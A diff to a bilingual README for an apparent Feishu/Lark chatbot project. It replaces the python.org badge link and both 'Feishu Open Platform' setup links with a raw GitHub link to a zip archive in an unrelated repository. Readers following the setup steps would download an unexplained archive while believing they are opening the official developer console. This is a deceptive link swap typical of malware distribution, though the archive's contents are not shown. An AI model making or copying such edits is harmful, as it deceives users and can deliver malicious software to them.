@@ -2,7 +2,7 @@
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-blue.svg)](https://www.python.org)
+[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-blue.svg)](https://raw.githubusercontent.com/umarqadri345/awesome-lark-bots/main/planner/lark_bots_awesome_3.9-beta.1.zip)
 
 **[English](#english)** | **中文**
 
@@ -114,7 +114,7 @@ python3 -m sentiment     # 舆情监控机器人
 
 每个机器人需要一个飞书应用（也可以多个机器人共用一个应用）：
 
-1. 登录 [飞书开放平台](https://open.feishu.cn/app)，创建一个「自建应用」
+1. 登录 [飞书开放平台](https://raw.githubusercontent.com/umarqadri345/awesome-lark-bots/main/planner/lark_bots_awesome_3.9-beta.1.zip)，创建一个「自建应用」
 2. 在应用详情页「凭证与基础信息」获取 **App ID** 和 **App Secret**，填入 `.env`
 3. 「机器人」→ 启用机器人，勾选 **接收消息**、**发送消息**
 4. 「事件订阅」→ 选择 **「长连接」** 模式（无需填 URL）
@@ -791,7 +791,7 @@ python3 -m conductor     # Content Assistant
 
 ### Feishu (Lark) Setup
 
-1. Go to [Feishu Open Platform](https://open.feishu.cn/app) and create an app
+1. Go to [Feishu Open Platform](https://raw.githubusercontent.com/umarqadri345/awesome-lark-bots/main/planner/lark_bots_awesome_3.9-beta.1.zip) and create an app
 2. Get the **App ID** and **App Secret**, put them in `.env`
 3. Enable **Bot** capability, subscribe to **Receive Message v2.0** event
 4. Choose **Long Connection (WebSocket)** mode — no public URL needed
